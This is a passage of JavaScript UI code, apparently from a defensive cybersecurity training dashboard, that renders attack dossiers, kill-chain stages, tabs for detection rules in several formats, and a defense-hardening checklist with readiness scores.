        <span class="module-mini-tag ${attack.moduleGroup}">${attack.moduleGroup.toUpperCase()}</span>
        <span class="severity-tag ${attack.severity}">${attack.severity}</span>
      </div>
      <div class="attack-title">${attack.shortName}</div>
      <div class="attack-mitre-brief">${attack.mitre}</div>
    `;

    card.addEventListener("click", () => {
      currentAttackId = attack.id;
      window.location.hash = `${attack.id}?tab=${currentTab}&filter=${currentFilter}`;
      document.querySelectorAll(".attack-card-nav").forEach(c => c.classList.remove("active"));
      card.classList.add("active");
      loadAttack(currentAttackId);
    });

    listContainer.appendChild(card);
  });
}

function loadAttack(attackId) {
  const attack = ATTACKS_DATA.find(a => a.id === attackId) || ATTACKS_DATA[0];
  currentAttackId = attack.id;
  const numStr = attack.num < 10 ? `0${attack.num}` : `${attack.num}`;

  // Sync active card in sidebar
  document.querySelectorAll(".attack-card-nav").forEach(c => {
    c.classList.toggle("active", c.getAttribute("data-id") === attack.id);
  });

  // Sync active tab indicator
  document.querySelectorAll(".tab-btn").forEach(b => {
    b.classList.toggle("active", b.getAttribute("data-tab") === currentTab);
  });
  document.querySelectorAll(".tab-panel").forEach(p => {
    p.classList.toggle("active", p.id === `tab-${currentTab}`);
  });

  // 1. Render Dossier Header
  const headerContainer = document.getElementById("dossier-header");
  headerContainer.innerHTML = `
    <div class="header-top-row">
      <div class="attack-badge-row">
        <span class="category-tag">${attack.module}</span>
        <span class="module-mini-tag ${attack.moduleGroup}">ATTACK ${numStr}</span>
        <span class="severity-tag ${attack.severity}">SEVERITY: ${attack.severity}</span>
        <span class="learning-mode-indicator">LEARNING MODE</span>
      </div>
      <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
        <button class="jump-to-assessment-btn" id="btn-jump-assessment" title="Launch Assessment Scenario with this threat vector">
          <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" stroke-width="2">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
          </svg>
          <span>Assess in Defense Scenarios</span>
        </button>
        <div class="cvss-score-box">
          <span class="cvss-label">CVSS Base</span>
          <span class="cvss-val ${attack.severity}">${attack.cvss}</span>
        </div>
      </div>
    </div>
    <h2 class="dossier-name">${attack.name}</h2>
    <p class="dossier-summary">${attack.summary}</p>
    <div class="header-meta-grid">
      <div class="meta-item">
        <span class="meta-title">MITRE ATT&CK Mapping</span>
        <span class="meta-content" style="color: var(--color-cyan);">${attack.mitre}</span>
      </div>
      <div class="meta-item">
        <span class="meta-title">Target Systems & Assets</span>
        <span class="meta-content">${attack.primaryTargets}</span>
      </div>
      <div class="meta-item">
        <span class="meta-title">Observed Threat Actors</span>
        <span class="meta-content">${attack.threatActors}</span>
      </div>
    </div>
  `;

  const jumpBtn = document.getElementById("btn-jump-assessment");
  if (jumpBtn) {
    jumpBtn.addEventListener("click", () => {
      if (typeof switchAppMode === "function") {
        switchAppMode("assessment");
      }
    });
  }

  renderAnatomyTab(attack);
  renderDetectionTab(attack);
  renderDefenseTab(attack);
}

function renderAnatomyTab(attack) {
  const container = document.getElementById("tab-anatomy");
  
  const phaseLabels = [
    "RECON & FOOTPRINTING",
    "PROBING & ENUMERATION",
    "WEAPONIZATION & SETUP",
    "EXPLOITATION / INJECTION",
    "ELEVATION & PERSISTENCE",
    "OBJECTIVES & EXFILTRATION"
  ];

  let killChainHtml = attack.killChain.map((step, idx) => {
    const phaseLabel = phaseLabels[idx] || `STAGE ${step.step}`;
    return `
      <div class="killchain-step">
        <div class="step-number-bubble">${step.step}</div>
        <div class="step-details">
          <div class="step-header">
            <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
              <span class="killchain-phase-pill">${phaseLabel}</span>
              <span class="step-title">${step.title}</span>
            </div>
            <span class="step-mitre">${step.mitre}</span>
          </div>
          <p class="step-desc">${step.desc}</p>
        </div>
      </div>
    `;
  }).join("");

  container.innerHTML = `
    <div class="content-card">
      <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; margin-bottom: 8px;">
        <h3 class="card-heading" style="margin-bottom: 0;">
          <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" fill="none" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
          Adversary Kill Chain Progression
        </h3>
        <span class="killchain-stage-badge">${attack.killChain.length}-STAGE ATTACK ANATOMY</span>
      </div>
      <p style="color: var(--text-secondary); font-size: 0.88rem; margin-bottom: 16px;">
        Chronological operational breakdown of adversary tactics, techniques, and execution flow.
      </p>
      <div class="killchain-track">
        ${killChainHtml}
      </div>
    </div>
  `;
}

function renderDetectionTab(attack) {
  const container = document.getElementById("tab-detection");

  const sourcesList = attack.telemetry.sources.map(s => `<li>${s}</li>`).join("");
  const anomaliesList = attack.telemetry.anomalies.map(a => `<li>${a}</li>`).join("");

  container.innerHTML = `
    <div class="content-card">
      <h3 class="card-heading">
        <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" fill="none" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
        Required Telemetry & Behavioral Anomalies
      </h3>
      <div class="telemetry-grid">
        <div class="telemetry-card">
          <h4>Essential Log Sources</h4>
          <ul>${sourcesList}</ul>
        </div>
        <div class="telemetry-card">
          <h4>Behavioral Anomaly Indicators</h4>
          <ul>${anomaliesList}</ul>
        </div>
      </div>

      <div class="code-viewer-container">
        <div class="code-viewer-header">
          <div class="rule-type-tabs" id="rule-format-tabs">
            <button class="rule-tab-btn ${currentRuleFormat === 'sigma' ? 'active' : ''}" data-format="sigma">Sigma Rule</button>
            <button class="rule-tab-btn ${currentRuleFormat === 'splunk' ? 'active' : ''}" data-format="splunk">Splunk SPL</button>
            <button class="rule-tab-btn ${currentRuleFormat === 'suricata' ? 'active' : ''}" data-format="suricata">Suricata IDS</button>
            <button class="rule-tab-btn ${currentRuleFormat === 'sysmon' ? 'active' : ''}" data-format="sysmon">Sysmon / Config</button>
          </div>
          <div class="code-actions">
            <button class="copy-rule-btn" id="copy-rule-btn" title="Copy rule to clipboard">
              <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" stroke-width="2">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
              </svg>
              Copy Rule
            </button>
          </div>
        </div>
        <pre class="code-pre-block"><code id="rule-code-content">${escapeHtml(attack.rules[currentRuleFormat] || '')}</code></pre>
      </div>
    </div>
  `;

  const ruleTabs = container.querySelectorAll(".rule-tab-btn");
  ruleTabs.forEach(btn => {
    btn.addEventListener("click", () => {
      ruleTabs.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      currentRuleFormat = btn.getAttribute("data-format");
      const codeBlock = document.getElementById("rule-code-content");
      if (codeBlock) {
        codeBlock.textContent = attack.rules[currentRuleFormat] || '';
      }
    });
  });

  const copyBtn = container.querySelector("#copy-rule-btn");
  if (copyBtn) {
    copyBtn.addEventListener("click", () => {
      const codeText = attack.rules[currentRuleFormat] || '';
      navigator.clipboard.writeText(codeText).then(() => {
        showToast("Detection rule copied to clipboard!");
      }).catch(err => {
        console.error("Clipboard copy failed", err);
      });
    });
  }
}

function renderDefenseTab(attack) {
  const container = document.getElementById("tab-defense");
  const storedChecklist = getCompletedChecklist();

  let completedForAttack = 0;
  attack.defenseChecklist.forEach(item => {
    if (storedChecklist[item.id]) completedForAttack++;
  });

  const percentage = Math.round((completedForAttack / attack.defenseChecklist.length) * 100);

  let checklistHtml = attack.defenseChecklist.map(item => {
    const isChecked = !!storedChecklist[item.id];
    return `
      <div class="checklist-item ${isChecked ? 'completed' : ''}" data-id="${item.id}" role="checkbox" aria-checked="${isChecked}">
        <div class="checklist-checkbox">
          ${isChecked ? `
            <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" stroke-width="3">
              <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
          ` : ''}
        </div>
        <div class="checklist-content">
          <div class="checklist-title-row">
            <span class="checklist-title">${item.title}</span>
            <span class="checklist-tier">${item.tier}</span>
          </div>
          <p class="checklist-desc">${item.desc}</p>
        </div>
      </div>
    `;
  }).join("");

  container.innerHTML = `
    <div class="content-card">
      <h3 class="card-heading">
        <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" fill="none" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        Defense Hardening & Zero-Trust Readiness
      </h3>
      <p style="color: var(--text-secondary); font-size: 0.88rem; margin-bottom: 16px;">
        Track and audit implementation of preventive technical controls across your enterprise estate.
      </p>

      <div class="defense-progress-bar-container">
        <div class="progress-header">
          <span class="progress-title">Defensive Posture Score: ${attack.shortName}</span>
          <span class="progress-percentage" id="attack-progress-text">${percentage}% Ready</span>
        </div>
        <div class="progress-track">
          <div class="progress-fill" id="attack-progress-fill" style="width: ${percentage}%;"></div>
        </div>
      </div>

      <div class="defense-checklist">
        ${checklistHtml}
      </div>
    </div>
  `;

  container.querySelectorAll(".checklist-item").forEach(itemEl => {
    itemEl.addEventListener("click", () => {
      const itemId = itemEl.getAttribute("data-id");
      const currentStorage = getCompletedChecklist();
      currentStorage[itemId] = !currentStorage[itemId];
      saveCompletedChecklist(currentStorage);
      renderDefenseTab(attack);
      updateGlobalReadiness();
    });
  });
}

function updateGlobalReadiness() {
  const stored = getCompletedChecklist();
  let totalItems = 0;
  let checkedItems = 0;

  ATTACKS_DATA.forEach(attack => {
    attack.defenseChecklist.forEach(item => {
      totalItems++;
      if (stored[item.id]) checkedItems++;
    });
  });

  const globalPercentage = totalItems > 0 ? Math.round((checkedItems / totalItems) * 100) : 0;
  const readinessEl = document.getElementById("global-readiness-val");
  if (readinessEl) {
    readinessEl.textContent = `${globalPercentage}%`;
  }
}

function showToast(message) {
  const toast = document.getElementById("toast");
  const toastText = document.getElementById("toast-text");
  if (!toast || !toastText) return;

  toastText.textContent = message;
  toast.classList.add("show");
  setTimeout(() => {
    toast.classList.remove("show");
  }, 2400);
}

function escapeHtml(text) {
  if (!text) return "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
